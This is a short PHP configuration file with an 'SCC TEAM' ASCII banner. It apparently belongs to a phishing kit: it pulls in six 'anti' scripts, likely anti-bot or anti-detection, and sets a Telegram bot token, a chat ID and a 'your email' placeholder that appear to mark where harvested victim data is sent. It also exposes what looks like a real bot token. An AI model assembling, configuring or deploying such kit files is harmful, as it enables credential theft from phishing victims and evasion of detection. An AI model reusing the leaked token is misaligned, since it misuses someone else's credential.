<?php
/*
  ██████     ▄████▄      ▄████▄              ▄▄▄█████▓   ▓█████     ▄▄▄          ███▄ ▄███▓
▒██    ▒    ▒██▀ ▀█     ▒██▀ ▀█              ▓  ██▒ ▓▒   ▓█   ▀    ▒████▄       ▓██▒▀█▀ ██▒
░ ▓██▄      ▒▓█    ▄    ▒▓█    ▄             ▒ ▓██░ ▒░   ▒███      ▒██  ▀█▄     ▓██    ▓██░
  ▒   ██▒   ▒▓▓▄ ▄██▒   ▒▓▓▄ ▄██▒            ░ ▓██▓ ░    ▒▓█  ▄    ░██▄▄▄▄██    ▒██    ▒██ 
▒██████▒▒   ▒ ▓███▀ ░   ▒ ▓███▀ ░              ▒██▒ ░    ░▒████▒    ▓█   ▓██▒   ▒██▒   ░██▒
▒ ▒▓▒ ▒ ░   ░ ░▒ ▒  ░   ░ ░▒ ▒  ░              ▒ ░░      ░░ ▒░ ░    ▒▒   ▓▒█░   ░ ▒░   ░  ░
░ ░▒  ░ ░     ░  ▒        ░  ▒                   ░        ░ ░  ░     ▒   ▒▒ ░   ░  ░      ░
░  ░  ░     ░           ░                      ░            ░        ░   ▒      ░      ░   
      ░     ░ ░         ░ ░                                 ░  ░         ░  ░          ░   
            ░           ░                                                                  
*/
include "anti/anti1.php";
include "anti/anti2.php"; 
include "anti/anti3.php"; 
include "anti/anti4.php"; 
include "anti/anti5.php"; 
include "anti/anti7.php"; 
$api = "5371804955:AAF9mHHqGojED0gNyFk62QCbrxkQH1qKspk";
$chatid = "5090243433";
$email ="your email";
?>
